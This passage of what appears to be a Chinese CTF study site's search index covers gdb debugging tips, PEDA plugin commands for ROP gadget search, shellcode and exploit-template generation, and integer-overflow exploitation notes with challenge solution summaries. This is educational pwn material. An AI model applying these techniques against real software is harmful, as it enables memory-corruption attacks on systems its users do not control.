\uff0810\uff09gdb\u6253\u5370\u6570\u7ec4\u7684\u9ed8\u8ba4\u957f\u5ea6\u4e3a200\u4e2a\uff0c\u5f53\u9700\u8981\u6253\u5370\u662f\u6570\u7ec4\u8f83\u5927\u65f6\u53ef\u4ee5\u4f7f\u7528 set print elements number-of-elements \u8bbe\u7f6e\u6700\u5927\u957f\u5ea6\uff0c\u6216\u8005 set print elements 0 \u8bbe\u7f6e\u6ca1\u6709\u6700\u5927\u9650\u5236\uff0c\u6216\u8005 set print elements unlimited \u8bbe\u7f6e\u6ca1\u6709\u6700\u5927\u9650\u5236\uff1b \uff0811\uff09\u6253\u5370\u6570\u7ec4\u4e2d\u4efb\u610f\u8fde\u7eed\u5143\u7d20\u7684\u503c\uff0c\u4f7f\u7528 p array[index]@num \uff0cindex\u4e3a\u6570\u7ec4\u7d22\u5f15\uff0c\u8868\u793a\u6253\u5370\u5f00\u59cb\u5904\uff0cnum\u4e3a\u6253\u5370\u7684\u4e2a\u6570\uff1b \uff0812\uff09\u9ed8\u8ba4\u4e0d\u6253\u5370\u6570\u7ec4\u7684\u7d22\u5f15\u4e0b\u6807\uff0c\u53ef\u4ee5\u8bbe\u7f6e set print array-indexes on \u6253\u5370\u7d22\u5f15\u4e0b\u6807\uff1b \uff0813\uff09\u6253\u5370\u5c40\u90e8\u53d8\u91cf\uff0c\u4e00\u4e2a\u662f\u4f7f\u7528 bt full \uff0c\u6253\u5370\u6240\u6709\u5c40\u90e8\u53d8\u91cf\u7684\u503c\uff0c\u53e6\u4e00\u4e2a\u662f\u4f7f\u7528 info locals \uff0c\u6253\u5370\u5f53\u524d\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\uff1b \uff0814\uff09\u67e5\u770b\u53d8\u91cf\u7c7b\u578b\uff0c\u4f7f\u7528 whatis v \uff0c\u67e5\u770b\u8be6\u7ec6\u53d8\u91cf\u7c7b\u578b\u4fe1\u606f\u4f7f\u7528 ptype v \uff1b \uff0815\uff09\u9ed8\u8ba4\u60c5\u51b5\u6253\u5370\u7ed3\u6784\u4f53\u6bd4\u8f83\u6df7\u4e71\uff0c\u53ef\u4ee5\u8bbe\u7f6e set print pretty on \uff0c\u5c31\u80fd\u5206\u884c\u663e\u793a\u7ed3\u6784\u4f53\u6bcf\u4e00\u4e2a\u53d8\u91cf\uff1b \uff0816\uff09\u6253\u5370\u5bf9\u8c61\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 set print object on \uff0c\u6309\u7167\u6d3e\u751f\u7c7b\u578b\u6253\u5370\u5bf9\u8c61\uff1b \uff0817\uff09\u6307\u5b9a\u7a0b\u5e8f\u7684\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\uff0c\u5148\u6253\u5f00\u4e00\u4e2a\u7ec8\u7aef\uff0c\u4f7f\u7528 tty \u547d\u4ee4\u67e5\u770b\u7ec8\u7aef\u53f7\uff0c\u7136\u540e\u4f7f\u7528\u547d\u4ee4\u6307\u5b9a\u8f93\u5165\u8f93\u51fa\u8bbe\u5907 gdb -tty /dev/pts/2 ./a.out \uff0c\u6216\u8005\u5728gdb\u547d\u4ee4\u884c\u4e0b\u4f7f\u7528 tty /dev/pts/2 \uff0c /dev/pts/2 \u4e3a\u5bf9\u5e94\u7ec8\u7aef\u8bbe\u5907\u53f7\uff1b \uff0818\uff09\" x \"\u547d\u4ee4\u4f1a\u628a\u6700\u540e\u68c0\u67e5\u7684\u5185\u5b58\u5730\u5740\u503c\u5b58\u5728\u201c $_ \u201d\u8fd9\u4e2a\u53d8\u91cf\u4e2d\uff0c\u5e76\u4e14\u4f1a\u628a\u8fd9\u4e2a\u5730\u5740\u4e2d\u7684\u5185\u5bb9\u653e\u5728\u201c $__ \u201d\u8fd9\u4e2a\u53d8\u91cf\u4e2d\uff0c\u6709\u4e9b\u9690\u5f0f\u8c03\u7528\u201c x \u201d\u547d\u4ee4\u7684\u547d\u4ee4\u4e5f\u4f1a\u51fa\u73b0\u8fd9\u79cd\u60c5\u51b5\uff0c\u6bd4\u5982info line\u6216info b\uff0c\u4f7f\u7528p $_\u548cp $__\u5c31\u53ef\u4ee5\u6253\u5370\u4e24\u4e2a\u503c\uff1b \uff0819\uff09\u5982\u679c\u9700\u8981\u540c\u65f6\u8c03\u8bd5\u7236\u5b50\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u8bbe\u7f6e set detach-on-fork off \uff0c\u8fd9\u6837gdb\u5c31\u80fd\u540c\u65f6\u8c03\u8bd5\u7236\u5b50\u8fdb\u7a0b\uff0c\u5e76\u4e14\u5728\u8c03\u8bd5\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u53e6\u5916\u4e00\u4e2a\u8fdb\u7a0b\u5904\u4e8e\u6302\u8d77\u72b6\u6001\uff0c\u5982\u679c\u60f3\u8ba9\u7236\u5b50\u8fdb\u7a0b\u90fd\u540c\u65f6\u8fd0\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528 set schedule-multiple on \uff1b \uff0820\uff09\u53ea\u5141\u8bb8\u4e00\u4e2a\u7ebf\u7a0b\u8fd0\u884c\uff0c\u8bbe\u7f6e set scheduler-locking on \uff1b \uff0821\uff09$_thread\u53d8\u91cf\u4fdd\u5b58\u5f53\u524d\u6b63\u5728\u8c03\u8bd5\u7684\u7ebf\u7a0b\u53f7\uff1b \uff0822\uff09\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u540c\u65f6\u8c03\u8bd5\u591a\u4e2a\u7a0b\u5e8f\uff0c\u9996\u5148\u8c03\u8bd5a\u7a0b\u5e8f\uff0c\u7136\u540e\u4f7f\u7528\u547d\u4ee4 add-inferior [ -copies n ] [ -exec executable ] \u52a0\u8f7d\u53e6\u4e00\u4e2a\u7a0b\u5e8f\uff0cn\u9ed8\u8ba4\u4e3a1\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 clone-inferior [ -copies n ] [ infno ] \u514b\u9686\u73b0\u6709\u7684\u7a0b\u5e8f\uff0c\u4f7f\u7528 i inferiors \uff0c\u67e5\u770b\u672c\u6b21\u4f1a\u8bdd\u6709\u591a\u5c11\u7a0b\u5e8f\uff0c\u4f7f\u7528 inferior num \u547d\u4ee4\u5207\u6362\u8fdb\u7a0b\uff1b \uff0823\uff09\u5f53\u88ab\u8c03\u8bd5\u7684\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0cgdb\u4f1a\u4f7f\u7528 $_exitcode \u53d8\u91cf\u8bb0\u5f55\u7a0b\u5e8f\u9000\u51fa\u65f6\u7684\u201c exit code \u201d\uff1b \uff0824\uff09\u8c03\u8bd5core dump\u6587\u4ef6\uff0c\u4f7f\u7528\u547d\u4ee4 gdb path/to/the/executable path/to/the/coredump \uff0c\u4e5f\u53ef\u4ee5gdb\u8d77\u6765\u540e\u52a0\u8f7d\u7a0b\u5e8f\u548ccore\uff0c\u4f7f\u7528file\u52a0\u8f7d\u7a0b\u5e8f\uff0c\u4f7f\u7528core\u52a0\u8f7dcore dump\uff1b \uff0825\uff09\u8bbe\u7f6e\u6c47\u7f16\u6307\u4ee4\u683c\u5f0f\uff0c\u9ed8\u8ba4\u662fAT&T\u683c\u5f0f\uff0c\u4f7f\u7528 set disassembly-flavor intel \u53ef\u4ee5\u6539\u4e3aintel\u683c\u5f0f\uff0c\u4f7f\u7528att\u53ef\u4ee5\u6539\u56de\uff0c\u76ee\u524d\u201cset disassembly-flavor\u201d\u547d\u4ee4\u53ea\u80fd\u7528\u5728Intel x86\u5904\u7406\u5668\u4e0a\uff0c\u5e76\u4e14\u53d6\u503c\u53ea\u6709\u201cintel\u201d\u548c\u201catt\u201d\uff1b \uff0826\uff09 b func \u4e0e b *func \u7684\u533a\u522b\uff0c\u524d\u8005\u4f1a\u65ad\u5728\u51fd\u6570\u8d77\u5b9e\u9645\u4f5c\u7528\u7684\u7b2c\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\uff0c\u800c\u540e\u8005\u4f1a\u65ad\u5728\u51fd\u6570\u7684\u7b2c\u4e00\u6761\u6c47\u7f16\u8bed\u53e5\uff1b \uff0827\uff09\u5728\u4efb\u610f\u60c5\u51b5\u4e0b\u53cd\u6c47\u7f16\u540e\u9762\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8bbe\u7f6e set disassemble-next-line on \uff0c\u5982\u679c\u8981\u5728\u540e\u9762\u7684\u4ee3\u7801\u6ca1\u6709\u6e90\u7801\u7684\u60c5\u51b5\u4e0b\u624d\u53cd\u6c47\u7f16\u540e\u9762\u8981\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8bbe\u7f6e set disassemble-next-line auto \uff0c\u5173\u95ed\u8fd9\u4e2a\u529f\u80fd\uff0c\u8bbe\u7f6e set disassemble-next-line off \uff1b \uff0828\uff09\u5c06\u6e90\u7a0b\u5e8f\u548c\u6c47\u7f16\u6307\u4ee4\u6620\u5c04\u8d77\u6765\uff0c\u4f7f\u7528\u547d\u4ee4 disas /m fun \uff1b \uff0829\uff09\u663e\u793a\u5c06\u8981\u6267\u884c\u7684\u6c47\u7f16\u6307\u4ee4\uff0c\u4f7f\u7528\u547d\u4ee4 display /ni $pc \u663e\u793a\u5f53\u7a0b\u5e8f\u505c\u6b62\u65f6\uff0c\u5c06\u8981\u6267\u884c\u7684n\u6761\u6c47\u7f16\u6307\u4ee4\uff0c\u53d6\u6d88\u53ef\u4ee5\u4f7f\u7528 undisplay \uff1b \uff0830\uff09\u6253\u5370\u5355\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\uff0c i registers regname \u6216 p $regname \uff1b \uff0831\uff09\u7f3a\u7701\u60c5\u51b5\u4e0bgdb\u662f\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u52a0\u8f7d\u7a0b\u5e8f\u7684\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u53ef\u5199\uff0c\u547d\u4ee4\u4e3a gdb -write ./exec \uff0c\u4e5f\u53ef\u4ee5\u5728gdb\u547d\u4ee4\u4e2d\u8bbe\u7f6e\u5e76\u91cd\u65b0\u52a0\u8f7d\u7a0b\u5e8f set write on \uff1b \uff0832\uff09PC\u5bc4\u5b58\u5668\u4f1a\u5b58\u50a8\u7a0b\u5e8f\u4e0b\u4e00\u6761\u8981\u6267\u884c\u7684\u6307\u4ee4\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u4fee\u6539PC\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\uff0c\u547d\u4ee4\u4e3a set var $pc=address \uff1b \uff0833\uff09command breaknum\uff0c\u5728\u65ad\u70b9breaknum\u5904\u4e2d\u65ad\u65f6\u9700\u8981\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e4b\u540e\u9700\u8981\u8f93\u5165\u547d\u4ee4\uff0c\u4f7f\u7528end\u7ed3\u675f\u547d\u4ee4\uff1b \uff0834\uff09\u53ef\u4ee5\u4f7f\u7528$_siginfo\u53d8\u91cf\u6765\u83b7\u53d6\u5f53\u524d\u4fe1\u53f7\u7684\u4e00\u4e9b\u4fe1\u606f\uff1b \uff0835\uff09\u663e\u793a\u5171\u4eab\u94fe\u63a5\u5e93\u4fe1\u606f\uff0c\u4f7f\u7528 info sharedlibrary regex \u547d\u4ee4\u53ef\u4ee5\u663e\u793a\u7a0b\u5e8f\u52a0\u8f7d\u7684\u5171\u4eab\u94fe\u63a5\u5e93\u4fe1\u606f\uff0c\u5176\u4e2d regex \u53ef\u4ee5\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u610f\u4e3a\u663e\u793a\u540d\u5b57\u7b26\u5408 regex \u7684\u5171\u4eab\u94fe\u63a5\u5e93\uff0c\u5982\u679c\u6ca1\u6709 regex \uff0c\u5219\u5217\u51fa\u6240\u6709\u7684\u5e93\uff0c\u5e26\u201c * \u201d\u8868\u793a\u5e93\u7f3a\u5c11\u8c03\u8bd5\u4fe1\u606f\uff1b \uff0836\uff09\u8bbe\u7f6e\u6309\u4f55\u79cd\u65b9\u5f0f\u89e3\u6790\u811a\u672c\uff0c set script-extension off/soft/strict \uff0coff\u8868\u793a\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u90fd\u89e3\u6790\u6210gdb\u7684\u547d\u4ee4\u811a\u672c\uff0c soft\u8868\u793a\u6839\u636e\u811a\u672c\u6587\u4ef6\u6269\u5c55\u540d\u51b3\u5b9a\u5982\u4f55\u89e3\u6790\u811a\u672c\uff0c\u5982\u679cgdb\u652f\u6301\u89e3\u6790\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\uff0c\u5c31\u6309\u8fd9\u79cd\u8bed\u8a00\u89e3\u6790\uff0c\u5426\u5219\u5c31\u6309\u547d\u4ee4\u811a\u672c\u89e3\u6790\uff0cstrict\u8868\u793a\u6839\u636e\u811a\u672c\u6587\u4ef6\u6269\u5c55\u540d\u51b3\u5b9a\u5982\u4f55\u89e3\u6790\u811a\u672c\uff0c\u5982\u679cgdb\u652f\u6301\u89e3\u6790\u8fd9\u79cd\u811a\u672c\u8bed\u8a00\uff0c\u5c31\u6309\u8fd9\u79cd\u8bed\u8a00\u89e3\u6790\uff0c\u5426\u5219\u4e0d\u89e3\u6790\uff1b \uff0837\uff09\u4fdd\u5b58\u5386\u53f2\u547d\u4ee4\uff0c set history save on \uff1b \uff0838\uff09\u8bbe\u7f6e\u6e90\u6587\u4ef6\u67e5\u627e\u8def\u5f84\uff0c directory path \uff1b \uff0839\uff09\u8fdb\u5165\u548c\u9000\u51fa\u56fe\u5f62\u754c\u9762\uff0cgdb\u65f6\u4f7f\u7528-tui\u53c2\u6570\uff0c\u6216\u8005gdb\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4f7f\u7528 Crtl+X+A \u7ec4\u5408\u952e\uff0c\u9000\u51fa\u76f8\u540c\uff1b \uff0840\uff09\u4f7f\u7528\u56fe\u5f62\u754c\u9762\u65f6\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u7a97\u53e3\uff0c layout asm \uff0c\u5982\u679c\u65e2\u60f3\u663e\u793a\u6c47\u7f16\u4ee3\u7801\u53c8\u60f3\u663e\u793a\u6e90\u7801\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 layout split \uff0c\u4f7f\u7528 layout regs \u663e\u793a\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u4f7f\u7528 tui reg float \u663e\u793a\u6d6e\u70b9\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u4f7f\u7528 tui reg system \u663e\u793a\u7cfb\u7edf\u5bc4\u5b58\u5668\u7a97\u53e3\uff0c\u5982\u679c\u60f3\u5207\u6362\u56de\u901a\u7528\u5bc4\u5b58\u5668\u53ef\u4ee5\u4f7f\u7528 tui reg general \u547d\u4ee4\uff1b \uff0841\uff09\u4e00\u4e9b\u547d\u4ee4\u7684\u7f29\u5199\uff1a b -> break c -> continue d -> delete f -> frame i -> info j -> jump l -> list n -> next p -> print r -> run s -> step u -> until aw -> awatch bt -> backtrace dir -> directory disas -> disassemble fin -> finish ig -> ignore ni -> nexti rw -> rwatch si -> stepi tb -> tbreak wa -> watch win -> winheight \uff0842\uff09\u4e0d\u79bb\u5f00gdb\u76f4\u63a5\u6267\u884cshell\u547d\u4ee4\uff0c\u4f7f\u7528 shell command \u6216\u8005 !command \u611f\u53f9\u53f7\u540e\u4e0d\u80fd\u6709\u7a7a\u683c\uff1b \uff0843\uff09\u8bbe\u7f6e\u88ab\u8c03\u8bd5\u7a0b\u5e8f\u7684\u53c2\u6570\uff0c gdb -args ./a.out a b c \uff0c\u6216\u8005 (gdb) set args a b c \uff0c\u663e\u793a\u53c2\u6570 show args \uff0c\u4e5f\u53ef\u4ee5\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\u76f4\u63a5\u6307\u5b9a\uff0c r a b c \uff0c\u5982\u679c\u60f3\u8ba9\u53c2\u6570\u4e3a\u7a7a\uff0c\u76f4\u63a5 set args \uff1b \uff0844\uff09\u8bbe\u7f6e\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u73af\u5883\u53d8\u91cf\uff0c set env varname=value \uff0c\u4f8b\u5982\uff1a set env LD_PRELOAD=/lib/x86_64-linux-gnu/libpthread.so.0 \uff0845\uff09\u4f7f\u7528 apropos regexp \u547d\u4ee4\u67e5\u627e\u6240\u6709\u7b26\u5408 regexp \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u547d\u4ee4\u4fe1\u606f\uff1b \uff0846\uff09\u53ef\u4ee5\u4f7f\u7528 set logging on \u628a\u6267\u884cgdb\u7684\u8fc7\u7a0b\u8bb0\u5f55\u4e0b\u6765\uff0c\u9ed8\u8ba4\u4fdd\u5b58\u5728gdb.txt\u4e2d\uff1b","title":"\u4e09\u3001\u6280\u5de7"},{"location":"RelatedKnowledge/pwn/gdb/#peda","text":"\uff081\uff09aslr\uff0c\u663e\u793a/\u8bbe\u7f6e gdb \u7684 ASLR\uff1b \uff082\uff09asmsearch\uff0c\u5728\u5185\u5b58\u4e2d\u641c\u7d22\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u4f8b\u5982\uff1a asmsearch \"int 0x80\" asmsearch \"add esp, ?\" libc \uff083\uff09assemble\uff0c\u76f4\u63a5\u6267\u884c\u4e00\u4e9b\u6c47\u7f16\u6307\u4ee4\uff0cend\u7ed3\u675f\uff1b \uff084\uff09checksec\uff0c\u68c0\u67e5\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5b89\u5168\u9009\u9879\uff1b \uff085\uff09cmpmem\uff0c\u6bd4\u8f83\u4e00\u6bb5\u5185\u5b58\u4e0e\u4e00\u4e2a\u6587\u4ef6\uff0c\u4f8b\u5982\uff1a cmpmem 0x08049000 0x0804a000 data.mem \uff086\uff09distance\uff0c\u8ba1\u7b97\u4e24\u4e2a\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb\uff1b \uff087\uff09dumpargs\uff0c\u5728\u8c03\u7528\u6307\u4ee4\u505c\u6b62\u65f6\u663e\u793a\u4f20\u9012\u7ed9\u51fd\u6570\u7684\u53c2\u6570\uff1b \uff088\uff09dumprop\uff0c\u5728\u7279\u5b9a\u7684\u5185\u5b58\u8303\u56f4\u663e\u793a ROP gadgets\uff1b \uff089\uff09elfheader\uff0c\u83b7\u53d6\u6b63\u5728\u8c03\u8bd5\u7684 ELF \u6587\u4ef6\u7684\u5934\u4fe1\u606f\uff1b \uff0810\uff09elfsymbol\uff0c\u4ece ELF \u6587\u4ef6\u4e2d\u83b7\u53d6\u6ca1\u6709\u8c03\u8bd5\u4fe1\u606f\u7684\u7b26\u53f7\u4fe1\u606f\uff1b \uff0811\uff09jmpcall\uff0c\u5728\u5185\u5b58\u4e2d\u641c\u7d22jmp/call\u6307\u4ee4\uff0c\u4f8b\u5982\uff1a jmpcall jmpcall eax jmpcall esp libc \uff0812\uff09loadmem\uff0c\u5c06\u4e00\u4e2a\u6587\u4ef6\u52a0\u8f7d\u5230\u6307\u5b9a\u5185\u5b58\uff0c\u4f8b\u5982\uff1a loadmem stack.mem 0xbffdf000 \uff0813\uff09lookup\uff0c\u641c\u7d22\u5c5e\u4e8e\u5185\u5b58\u8303\u56f4\u7684\u5730\u5740\u7684\u6240\u6709\u5730\u5740/\u5f15\u7528\uff1b \uff0814\uff09nextcall\uff0c\u4e00\u76f4\u6b65\u5165\u6267\u884c\u5230 call \u6307\u4ee4\uff0cnextjmp\uff0c\u4e00\u76f4\u6b65\u5165\u6267\u884c\u5230 j \u6307\u4ee4\uff1b \uff0815\uff09patch\uff0c \uff0816\uff09pattern\uff0c\u751f\u6210\uff0c\u641c\u7d22\u6216\u5199\u5165\u5faa\u73af pattern \u5230\u5185\u5b58\uff1b \uff0817\uff09procinfo\uff0c\u663e\u793a\u8c03\u8bd5\u8fdb\u7a0b\u7684 /proc/pid/\uff1b \uff0818\uff09pshow\uff0c\u663e\u793a\u5404\u79cd PEDA \u9009\u9879\u548c\u5176\u4ed6\u8bbe\u7f6e\uff0cpset\uff0c\u8bbe\u7f6e\u5404\u79cd PEDA \u9009\u9879\u548c\u5176\u4ed6\u8bbe\u7f6e\uff1b \uff0819\uff09readelf\uff0c\u83b7\u53d6\u6587\u4ef6\u5934\u3001\u6bb5\u4fe1\u606f\uff1b \uff0820\uff09ropgadget\uff0c\u83b7\u53d6\u4e8c\u8fdb\u5236\u6216\u5e93\u7684\u5e38\u89c1 ROP gadgets\uff1b \uff0821\uff09ropsearch\uff0c\u641c\u7d22\u5185\u5b58\u4e2d\u7684 ROP gadgets\uff1b \uff0822\uff09searchmem|find\uff0c\u641c\u7d22\u5185\u5b58\u4e2d\u7684 pattern\uff0c\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u641c\u7d22\uff1b \uff0823\uff09shellcode\uff0c\u751f\u6210\u6216\u4e0b\u8f7d\u5e38\u89c1\u7684 shellcode\uff0c\u4f8b\u5982\uff1a shellcode x86/linux exec \uff0824\uff09skeleton\uff0c\u751f\u6210 python exploit \u4ee3\u7801\u6a21\u677f\uff0c\u4f8b\u5982\uff1a skeleton argv exploit.py \uff0825\uff09stepuntil\uff0c\u6b65\u5165\u76f4\u5230\u9047\u89c1\u6307\u5b9a\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u4f8b\u5982\uff1a stepuntil cmp \uff0826\uff09strings\uff0c\u663e\u793a\u5185\u5b58\u4e2d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u4e32\uff1b \uff0827\uff09vmmap\uff0c\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\u83b7\u53d6\u6bb5\u7684\u865a\u62df\u6620\u5c04\u5730\u5740\u8303\u56f4\uff1b vmmap libc vmmap stack vmmap binary \uff0828\uff09xormem\uff0c\u7528\u4e00\u4e2a key \u6765\u5bf9\u4e00\u4e2a\u5185\u5b58\u533a\u57df\u6267\u884c XOR \u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a xormem 0x08049000 0x0804a000 \u201cthekey\u201d","title":"\u56db\u3001peda\u547d\u4ee4"},{"location":"TypesofChallenge/pwn/integer_overflow/","text":"\u6574\u6570\u6ea2\u51fa \u4e00\u3001\u6f0f\u6d1e\u6210\u56e0 \u6574\u578b\u6570\u636e\u5728\u5185\u5b58\u4e2d\u662f\u4e00\u4e2a\u56fa\u5b9a\u957f\u5ea6\u7684\u7a7a\u95f4\uff0c\u5f53\u53d1\u751f\u8d4b\u503c\u65f6\uff0c\u53ef\u80fd\u8d85\u51fa\u6700\u5927\u503c\uff08\u6216\u6700\u5c0f\u503c\uff09\uff0c\u5bfc\u81f4\u6574\u6570\u6ea2\u51fa\u3002 \u6574\u6570\u6ea2\u51fa\u672c\u8eab\u5e76\u6ca1\u6709\u6539\u5199\u989d\u5916\u5185\u5b58\uff0c\u4f46\u662f\u5982\u679c\u8be5\u6574\u578b\u503c\u5bf9\u5e94\u7684\u662f\u7f13\u51b2\u533a\u5927\u5c0f\u6216\u6570\u503c\u7d22\u5f15\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u6f5c\u5728\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u4ece\u800c\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002 \u4e8c\u3001\u4e3b\u8981\u77e5\u8bc6 \u7c7b\u578b \u5b57\u8282 \u8303\u56f4 __int8,bool,char 1byte 0~127(0~0x7f) -128~-1(0x80~0xff) unsigned char 1byte 0~255(0~0xff) __int16,short 2byte(word) 0~32767(0~0x7fff) -32768~-1(0x8000~0xffff) unsigned short 2byte(word) 0~65535(0~0xffff) __int32,int,long 4byte(dword) 0~2147483647(0~0x7fffffff) -2147483648~-1(0x80000000~0xffffffff) unsigned int,unsigned long 4byte(dword) 0~4294967295(0~0xffffffff) __int64,long long 8byte(qword) \u6b63: 0~0x7fffffffffffffff \u8d1f: 0x8000000000000000~0xffffffffffffffff unsigned long long 8byte(qword) 0~0xffffffffffffffff \u4e09\u3001CTF\u9898\u578b\u5206\u7c7b \u6ce8\u610f\uff1a\u56e0\u6574\u6570\u6ea2\u51fa\u7684\u7279\u6b8a\u6027\uff0c\u5728PWN\u7c7b\u578b\u4e2d\u5f80\u5f80\u4e0e\u7f13\u51b2\u533a\u6ea2\u51fa\u540c\u65f6\u8003\u5bdf\uff0c\u6b64\u5916\u8fd8\u53ef\u80fd\u51fa\u73b0\u5728WEB\uff0cRE\u7b49\u9898\u578b\u4e2d\u3002 1\u3001\u672a\u9650\u5236\u8303\u56f4 \uff081\uff09\u9898\u578b\u7279\u5f81 \u53d8\u91cf\u8d4b\u503c\uff0c\u6ca1\u6709\u6709\u6548\u5730\u9650\u5236\u5176\u8303\u56f4\u3002 a\u3001\u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\uff0c\u5f53\u540c\u7b26\u53f7\u7684\u4e24\u6570\u76f8\u52a0\uff08\u4e58\uff09\u65f6\uff0c\u5c31\u53ef\u80fd\u6539\u53d8\u7b26\u53f7\u4f4d\uff0c\u5bfc\u81f4\u6ea2\u51fa\u3002 b\u3001\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6570\uff0c\u5f53\u6700\u5c0f\u6570-1\u65f6\u53d8\u4e3a\u6700\u5927\u6570\uff0c\u5f53\u6700\u5927\u6570+1\u65f6\u53d8\u4e3a\u6700\u5c0f\u6570\uff0c\u5bfc\u81f4\u56de\u7ed5\u3002 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def a\u3001\u6ce8\u610f\u754c\u9650\uff0c\u7528char\u578b\u6765\u4e3e\u4f8b\uff0c127+1=-128\uff0c-128-1=127\uff0c0-1=-1\uff0c-1+1=0\uff1b \u200b \u7528unsigned char\u578b\u6765\u4e3e\u4f8b\uff0c0-1=255\uff0c255+1=0\uff1b b\u3001\u6ce8\u610f\u76f8\u7b49\u5173\u7cfb\uff0c\u7528int\u578b\u6765\u4e3e\u4f8b\uff0c0x80000000 = -0x80000000\uff1b 2\u3001\u9519\u8bef\u7684\u7c7b\u578b\u8f6c\u6362 \uff081\uff09\u9898\u578b\u7279\u5f81 \u53c2\u6570\u4f20\u9012\u65f6\uff0c\u88ab\u8feb\u7c7b\u578b\u8f6c\u6362\u3002 a\u3001\u5f53\u5c06\u4e00\u4e2a\u8f83\u5927\u5bbd\u5ea6\u7684\u6570\u5b58\u5165\u4e00\u4e2a\u8f83\u5c0f\u5bbd\u5ea6\u53d8\u91cf\u4e2d\u65f6\uff0c\u9ad8\u4f4d\u53d1\u751f\u622a\u65ad\u3002 b\u3001\u5f53\u6709\u7b26\u53f7\u6570\u4f5c\u4e3a\u65e0\u7b26\u53f7\u6570\u4f7f\u7528\u65f6\uff0c\u9020\u6210\u6570\u636e\u91cf\u7684\u6269\u5927\u3002 \uff082\uff09\u5e38\u7528\u89e3\u9898\u5957\u8def a\u3001\u9690\u85cf\u7684\u7c7b\u578b\uff0ctypedef unsigned int size_t\uff1b b\u3001\u6f0f\u6d1e\u591a\u53d1\u51fd\u6570\uff0cvoid memcpy(void dest, const void *src, size_t n); \u200b char strncpy(char dest, const char *src, size_t n); \u200b size_t read(int fd, const void* buf, size_t n); c\u3001\u7279\u522b\u6ce8\u610f\u7c7b\u578b\u7684\u5927\u5c0f\uff0clong long > long = int > short > char\uff1b \u56db\u3001\u4f8b\u9898 1\u3001\u7f51\u9f0e\u676f-2020-\u767d\u864e\u7ec4-\u6076\u9f99 \uff081\uff09\u9898\u76ee \u8fd9\u662f\u4e00\u4e2a\u4e0e\u53f2\u83b1\u59c6\u548c\u6076\u9f99\u6218\u6597\u7684\u6545\u4e8b\uff0c\u8bf7\u6218\u80dc\u4e09\u5934\u6076\u9f99\uff0c\u53d6\u5f97flag\u3002\u5f20\u4e09\u957f\u8001\u8bf4\uff0c\u8bd5\u56fepatch\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4eba\u4f1a\u5f97\u5230\u9519\u8bef\u7684flag\u2026 \uff082\uff09\u89e3\u9898\u601d\u8def \u6709\u7b26\u53f7\u6570\u7684\u6ea2\u51fa\uff0c\u4ece\u8d1f\u6570\u6ea2\u51fa\u5230\u6b63\u6570\uff0c\u7ed5\u8fc7\u9a8c\u8bc1\u6761\u4ef6\uff0c\u5b9e\u73b0\u6570\u503c\u7684\u6539\u5199\uff0c\u5f97\u5230flag\u3002 \uff083\uff09 wp 2\u3001\u653b\u9632\u4e16\u754c-PWN\u65b0\u624b\u533a-int_overflow \uff081\uff09\u9898\u76ee \u8fd9\u9898\u4f3c\u4e4e\u6ca1\u6709\u529e\u6cd5\u6ea2\u51fa\uff0c\u771f\u7684\u4e48? \uff082\uff09\u89e3\u9898\u601d\u8def \u4e00\u4e2asize_t\u5230unsigned __int8\u7684\u9690\u85cf\u7c7b\u578b\u8f6c\u6362\uff0c\u5bfc\u81f4\u622a\u65ad\u53ef\u7ed5\u8fc7\u6761\u4ef6\u8bed\u53e5\uff0c\u9020\u6210\u6808\u6ea2\u51fa\uff0c\u6539\u5199\u8fd4\u56de\u5730\u5740\u3002 \uff083\uff09 wp 3\u3001ZCTF-2016-note3 \uff081\uff09\u9898\u76ee \u65e0\u3002 \uff082\uff09\u89e3\u9898\u601d\u8def \u4f7f\u75280x8000000000000000 = -0x8000000000000000\u7ed5\u8fc7\u9650\u5236\u6761\u4ef6\uff0c\u7136\u540e\u5c31\u662f\u6b63\u5e38\u7684unlink\u3002 \uff083\uff09 wp \u4e94\u3001\u5907\u6ce8 